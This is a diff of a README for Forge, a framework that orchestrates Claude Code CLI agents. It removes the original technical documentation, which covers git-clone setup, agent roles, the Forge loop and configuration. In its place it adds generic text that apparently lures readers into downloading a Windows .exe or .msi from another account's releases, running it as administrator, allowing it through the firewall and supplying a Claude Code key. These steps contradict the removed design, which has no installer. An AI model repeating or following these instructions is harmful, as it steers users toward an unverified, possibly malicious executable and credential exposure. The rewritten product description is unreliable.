@@ -1,436 +1,140 @@
-<div align="center">
+# ⚙️ Forge - Build AI Teams with Ease
 
-<h1><img src="icon.png" width="80" align="center" />&nbsp;Forge</h1>
+[![Download Forge](https://img.shields.io/badge/Download-Forge-blue?style=for-the-badge)](https://github.com/gabbylists/Forge)
 
-### AI-Powered Development Team Orchestrator
-
-**Transform a single Claude Code CLI into a full virtual development team.**
-
-[![Built with Claude](https://img.shields.io/badge/Built%20with-Claude%20Code-blueviolet?style=for-the-badge&logo=anthropic)](https://claude.ai)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![Agents](https://img.shields.io/badge/Agents-6%20Roles-orange?style=for-the-badge)](#-the-team)
-[![Skills](https://img.shields.io/badge/Skills-10+-blue?style=for-the-badge)](#-skill-system)
-
-[English](README.md) | [繁體中文](README.zh-TW.md)
+Forge helps you turn a simple command-line tool into a full AI development team. It manages project managers, architects, frontend and backend engineers, quality assurance, and DevOps agents all in one place. You do not need any programming experience to get started.
 
 ---
 
-*From a single sentence of requirement to a fully delivered product —*
-*Forge handles the planning, delegation, quality assurance, and delivery automatically.*
+## 🔎 What is Forge?
 
-</div>
+Forge brings multiple AI agents together to work as a team automatically. These agents have different roles, such as planning, coding, testing, and deployment. You only need to provide a Claude Code CLI as a starting point. Forge organizes everything else in the background. This makes AI development easier, even for users without technical skills.
 
----
+Key features include:
 
-## What is Forge?
+- Auto-management of AI roles like PM, Architect, Engineers, QA, and DevOps.
+- Works with Claude Code CLI and other AI tools.
+- Handles workflows and task orchestration.
+- Provides a simple way to run complex AI projects.
 
-Forge is an **orchestration framework** that runs on top of [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code). It turns a single AI assistant into a coordinated development team with specialized roles — a Product Manager, an Architect, Frontend/Backend Engineers, a QA Reviewer, and a DevOps Engineer — all working together under one Orchestrator.
-
-Think of it as a **virtual software company** living inside your `.claude/` directory:
-
-```
-You (the CEO)
- └─ Forge Orchestrator (the Factory Manager)
-     ├─ PM Agent           → analyzes requirements, writes specs
-     ├─ Architect Agent    → designs systems, makes tech decisions
-     ├─ Frontend Dev Agent → builds UI with React/Next.js/Tailwind
-     ├─ Backend Dev Agent  → implements APIs, database, server logic
-     ├─ QA Reviewer Agent  → validates every deliverable
-     └─ DevOps Agent       → handles deployment, CI/CD, Docker
-```
-
-### Why Forge?
-
-| Problem | Forge's Solution |
-|---------|-----------------|
-| AI loses context between conversations | Persistent project state — resume from exactly where you left off |
-| AI writes code without understanding requirements | PM Agent clarifies needs first; Architect designs before coding |
-| No quality gate on AI-generated code | Every task passes QA (build, lint, type-check, functional review) |
-| Single AI tries to do everything | Specialized agents with domain knowledge and isolated contexts |
-| Knowledge doesn't accumulate | Skills evolve over time; lessons from past projects improve future ones |
+Topics related to Forge are agentic workflows, AI agents, automation, and developer tools.
 
 ---
 
-## Usage
+## 📥 Download Forge
 
-### Prerequisites
+You can get Forge from this page:  
+[https://github.com/gabbylists/Forge](https://github.com/gabbylists/Forge)
 
-- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) installed and configured
-- Node.js 18+ (for project builds)
-- Git
-
-### Quick Start
-
-**1. Clone the repository**
-
-```bash
-git clone https://github.com/your-username/forge.git
-cd forge
-```
-
-**2. Launch Claude Code**
-
-```bash
-claude
-```
-
-Forge loads automatically via `.claude/CLAUDE.md` — no extra setup needed.
-
-**3. Start your first project**
-
-```
-/start
-```
-
-Then describe your requirement in natural language:
-
-```
-I want to build a personal blog with Next.js.
-It should have a markdown-based post system,
-dark mode support, and an RSS feed.
-```
-
-Forge will:
-1. Route your request to the PM Agent for requirement analysis
-2. Generate a structured spec and task breakdown
-3. Dispatch tasks to the appropriate agents
-4. Run QA on every deliverable
-5. Commit passing code automatically
-
-**4. Check progress anytime**
-
-```
-/status
-```
-
-**5. Resume across sessions**
-
-Just open Claude Code in the same directory. Forge reads the saved state and picks up where it left off.
-
-### Slash Commands
-
-| Command | Description |
-|---------|-------------|
-| `/start` | Launch a new requirement — enters the intake workflow |
-| `/status` | View current project progress and task overview |
-| `/plan` | View or modify the project spec |
-| `/review` | Trigger a full QA audit on all pending tasks |
-| `/retro` | Run a retrospective — analyze lessons and update skills |
-| `/switch` | Switch between active projects |
+Click the button above to open the GitHub page. From there, you will find instructions and files to download Forge.
 
 ---
 
-## Architecture
+## 💻 System Requirements
 
-### Dual-Layer Design
+Before you install Forge, make sure your computer meets these minimum requirements:
 
-Forge separates **system-level concerns** (agents, skills, protocols) from **project-level data** (specs, tasks, code). This keeps projects self-contained and portable.
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    .claude/ (System Layer)                   │
-│                                                             │
-│   agents/          6 specialized AI team members            │
-│   skills/          10+ reusable knowledge packages          │
-│   orchestra/       protocols, templates, routing rules       │
-│   state/           cross-session memory & preferences        │
-│   CLAUDE.md        single entry point (auto-loaded)          │
-└─────────────────────────────────────────────────────────────┘
-                              │
-                    ┌─────────┴─────────┐
-                    ▼                   ▼
-┌──────────────────────┐  ┌──────────────────────┐
-│  projects/blog/      │  │  projects/api/       │
-│                      │  │                      │
-│  README.md           │  │  README.md           │
-│  project.json        │  │  project.json        │
-│  spec/current.md     │  │  spec/current.md     │
-│  tasks/TASK-001.md   │  │  tasks/TASK-001.md   │
-│  reviews/            │  │  reviews/            │
-│  sessions/           │  │  sessions/           │
-│  src/                │  │  src/                │
-└──────────────────────┘  └──────────────────────┘
-```
-
-### The Forge Loop
-
-The core execution engine that drives every project:
-
-```
-                    ┌──────────────┐
-                    │  Scan Tasks  │ ◄─────────────────────┐
-                    └──────┬───────┘                       │
-                           │                               │
-                    ┌──────▼───────┐                       │
-                    │ Pick Highest │                       │
-                    │ Priority Task│                       │
-                    └──────┬───────┘                       │
-                           │                               │
-                    ┌──────▼───────┐                       │
-                    │ Match Agent  │                       │
-                    │ (semantic)   │                       │
-                    └──────┬───────┘                       │
-                           │                               │
-                    ┌──────▼───────┐     ┌────────────┐   │
-                    │  Dispatch    │────►│ Escalation │   │
-                    │  via Task    │     │ Handler    │   │
-                    └──────┬───────┘     └────────────┘   │
-                           │                               │
-                    ┌──────▼───────┐                       │
-                    │  QA Review   │                       │
-                    │  (build,     │                       │
-                    │   lint,      │                       │
-                    │   types,     │                       │
-                    │   function)  │                       │
-                    └──────┬───────┘                       │
-                           │                               │
-                    ┌──────▼───────┐    ┌──────────────┐  │
-                    │    Pass?     │─NO─► Re-dispatch   │──┘
-                    └──────┬───────┘    │ (max 3x)     │
-                           │YES        └──────────────┘
-                    ┌──────▼───────┐
-                    │ Commit +     │
-                    │ Update State │
-                    └──────┬───────┘
-                           │
-                    ┌──────▼───────┐
-                    │ Next Task /  │
-                    │ Deliver      │
-                    └──────────────┘
-```
-
-### Workflow Routing
-
-Forge automatically classifies your input and routes it to the right workflow:
-
-| Input Type | Scale | Route |
-|-----------|-------|-------|
-| Any task | Micro (≤3 files, clear goal) | **Route E** — Direct execution, skip PM |
-| New feature | Small (single module) | **Route A** — Simplified planning |
-| New feature | Medium/Large (multi-module) | **Route A** — Full planning with Architect |
-| Bug fix | Any | **Route A** or **Route E** |
-| Continue work | Any | **Route B** — Resume from saved state |
-| Clarification needed | Any | **Route C** — PM handles Q&A |
-| QA failures pending | Any | **Route D** — Fix and re-review |
+- Operating System: Windows 10 or newer
+- Processor: Intel i3 or equivalent
+- RAM: 8 GB or more
+- Disk Space: At least 2 GB free space
+- Internet Connection: Required for initial download and some features
+- Permissions: Ability to install software and run command-line applications
 
 ---
 
-## The Team
+## 🚀 Getting Started: How to Download and Run Forge on Windows
 
-### Agent Roles
+This section guides you step-by-step to get Forge running.
 
-<table>
-<tr>
-<td align="center" width="150">
+### Step 1: Visit the Forge GitHub page
 
-**🎯 PM**
+Go to this link in your web browser:  
+[https://github.com/gabbylists/Forge](https://github.com/gabbylists/Forge)
 
-Product Manager
+This is the official page where you can find the latest version of Forge.
 
-</td>
-<td>
+### Step 2: Find the latest release
 
-Analyzes requirements, communicates with users, writes structured specs (OpenSpec format), breaks work into tasks. Asks clarifying questions when requirements are < 80% complete.
+On the GitHub page, look for the "Releases" section. It is usually on the right side or under the "Code" tab.
 
-</td>
-</tr>
-<tr>
-<td align="center">
+Click the latest release to open the download options.
 
-**🏗️ Architect**
+### Step 3: Download the Windows version
 
-System Architect
+In the release page, find the download file for Windows. This file typically ends with `.exe` or `.msi`.
 
-</td>
-<td>
+Click the file name to start downloading.
 
-Makes technology choices, designs system architecture, writes ADRs (Architecture Decision Records). Activated for medium/large projects or when other agents escalate.
+### Step 4: Run the installer
 
-</td>
-</tr>
-<tr>
-<td align="center">
+Once the download finishes:
 
-**🎨 Frontend Dev**
+- Find the file in your Downloads folder.
+- Double-click the file to start the installer.
+- Follow the on-screen instructions to complete the installation.
 
-Frontend Engineer
+You may need to allow the program to run if Windows asks for permission.
 
-</td>
-<td>
+### Step 5: Open Forge
 
-Builds UI components, page layouts, responsive design. Specializes in React, Next.js (App Router), and Tailwind CSS.
+After installation:
 
-</td>
-</tr>
-<tr>
-<td align="center">
+- Press the Windows key.
+- Type "Forge" in the search box.
+- Click the Forge app to open it.
 
-**⚙️ Backend Dev**
-
-Backend Engineer
-
-</td>
-<td>
-
-Implements API endpoints, database schemas, server logic. Works with Node.js, Next.js API Routes, and database operations.
-
-</td>
-</tr>
-<tr>
-<td align="center">
-
-**✅ QA Reviewer**
-
-Quality Assurance
-
-</td>
-<td>
-
-Validates every deliverable: runs `npm run build`, `npm run lint`, `npx tsc --noEmit`, checks functional completeness, and reviews code quality.
-
-</td>
-</tr>
-<tr>
-<td align="center">
-
-**🚀 DevOps**
-
-DevOps Engineer
-
-</td>
-<td>
-
-Handles deployment configs, CI/CD pipelines, Docker containers, environment management, and git branch operations.
-
-</td>
-</tr>
-</table>
-
-### Escalation Protocol
-
-Agents can request help from other agents without blocking their work:
-
-```
-Agent hits a problem beyond their expertise
-        │
-        ▼
-Returns ##ESCALATION marker to Orchestrator
-        │
-        ├─ blocking: true  → Current task paused, target agent dispatched
-        │
-        └─ blocking: false → Noted for later, current task continues
-```
+Forge runs a simple user interface that will guide you further.
 
 ---
 
-## Skill System
+## 🔧 How to Use Forge
 
-Skills are reusable knowledge packages injected into agent contexts. They evolve over time as the team accumulates experience.
+Forge works by connecting to Claude Code CLI and managing AI agents for you.
 
-### Domain Skills
+### Basic steps to start a project:
 
-| Skill | Description | Used By |
-|-------|-------------|---------|
-| `code-style` | Naming conventions, formatting rules, import ordering | All dev agents |
-| `api-conventions` | RESTful patterns, error formats, pagination strategies | PM, Architect, Backend |
-| `react-patterns` | Next.js App Router, component patterns, state management | Frontend Dev |
-| `testing-standards` | Test strategies, coverage targets, naming conventions | QA Reviewer, dev agents |
+1. Launch Forge.
+2. Provide your Claude Code CLI key or set it up as instructed.
+3. Choose the type of AI project you want to run.
+4. Let Forge organize the different AI agents automatically.
+5. Monitor progress and outputs through the Forge interface.
 
-### How Skills Evolve
-
-```
-1st occurrence of a pattern  →  Noted in QA review
-2nd occurrence               →  Added to skill's references/lessons.md
-3rd+ occurrence              →  Promoted to core skill definition
-```
+You do not need to know how the AI agents work. Forge takes care of the technical parts.
 
 ---
 
-## Project Lifecycle
+## 🛠 What Forge Does in the Background
 
-```
- ┌──────┐    ┌──────────┐    ┌──────────┐    ┌───────────┐    ┌───────────┐
- │Intake│───►│ Planning │───►│  Coding  │───►│ Reviewing │───►│ Delivery  │
- │      │    │          │    │          │    │           │    │           │
- │ /start│    │ PM+Arch  │    │ Dev team │    │ QA loops  │    │ Git tag   │
- │ talk  │    │ write    │    │ builds   │    │ until     │    │ Retro     │
- │ to PM │    │ spec +   │    │ features │    │ all pass  │    │ Cleanup   │
- │      │    │ tasks    │    │          │    │           │    │           │
- └──────┘    └──────────┘    └──────────┘    └───────────┘    └───────────┘
-```
+Forge creates a multi-agent system using AI roles:
 
-Each project is fully self-contained in `projects/{name}/` with:
+- **Project Manager (PM):** Plans and assigns tasks.
+- **Architect:** Designs the project structure.
+- **Frontend Engineer:** Works on user interface code.
+- **Backend Engineer:** Handles the server and logic.
+- **Quality Assurance (QA):** Tests the code for errors.
+- **DevOps:** Automates build and deployment processes.
 
-| File/Dir | Purpose |
-|----------|---------|
-| `project.json` | State machine — status, progress, tech stack, session history |
-| `spec/current.md` | Living requirements document (OpenSpec format) |
-| `tasks/TASK-*.md` | Individual work units with acceptance criteria |
-| `reviews/` | QA reports for each task |
-| `sessions/` | Conversation logs for continuity |
-| `src/` | The actual deliverables (code, assets, configs) |
+These agents communicate to deliver a complete software product. You can think of it as an AI team working on your project around the clock.
 
 ---
 
-## Safety & Guardrails
+## ⚙️ Common Issues and Tips
 
-Forge includes multiple safety mechanisms:
-
-| Mechanism | Limit | Behavior |
-|-----------|-------|----------|
-| Total loop iterations | 50 | Save progress → report → pause |
-| QA retries per task | 3 | Mark task as blocked |
-| Consecutive failures | 3 | Emergency pause → await user input |
-
-The Orchestrator **never** writes code directly. It delegates, reviews, and coordinates — ensuring every piece of code goes through proper QA before being committed.
+- If the installer doesn't start, check your internet connection or try downloading again.
+- Run the installer as administrator if you see permission errors.
+- Make sure to allow Forge access through your firewall if prompted.
+- For any setup or usage questions, check the Discussions tab on the GitHub page for help from the community.
 
 ---
 
-## Configuration
+## 🧩 Additional Resources
 
-### User Preferences
-
-Edit `.claude/state/preferences.yaml` to customize:
-
-```yaml
-tech_stack:
-  frontend: "Next.js 16 (App Router)"
-  styling: "Tailwind CSS"
-  language: "TypeScript (strict mode)"
-  backend: "Node.js / Next.js API Routes"
-  database: "SQLite (small) | PostgreSQL (medium/large)"
-
-code_style:
-  indent: 2
-  quotes: single
-  semicolons: false
-  max_line_width: 100
-
-communication:
-  language: "繁體中文"
-  style: "direct and concise"
-```
-
-### Adding Custom Agents
-
-Create a new `.md` file in `.claude/agents/` following the template at `.claude/orchestra/templates/agent-template.md`. The Orchestrator will automatically discover and route tasks to it based on the `description` field.
+- Visit the GitHub repository to explore code and issues:  
+  [https://github.com/gabbylists/Forge](https://github.com/gabbylists/Forge)
+- Look for updates, bug fixes, and new features in the Releases section.
+- Use Discussions for asking non-technical questions about running Forge.
 
 ---
 
-## Design Principles
-
-| Principle | Description |
-|-----------|-------------|
-| **Orchestrator Pattern** | Single coordinator, parallel specialized agents |
-| **Zero Context Loss** | Full state persistence — resume from any breakpoint |
-| **Quality Gate** | Every delivery must pass QA; failures loop back with diagnostics |
-| **Self-Contained Projects** | Portable, handoff-ready, readable by humans and AI |
-| **Cumulative Learning** | Skills, preferences, and patterns improve over time |
-| **Scale Adaptive** | Same framework for 5-minute fixes and multi-month projects |
-| **Semantic Routing** | Task descriptions auto-match to the best agent |
-
----
-
-## License
-
-MIT
+[![Download Forge](https://img.shields.io/badge/Download-Forge-blue?style=for-the-badge)](https://github.com/gabbylists/Forge)
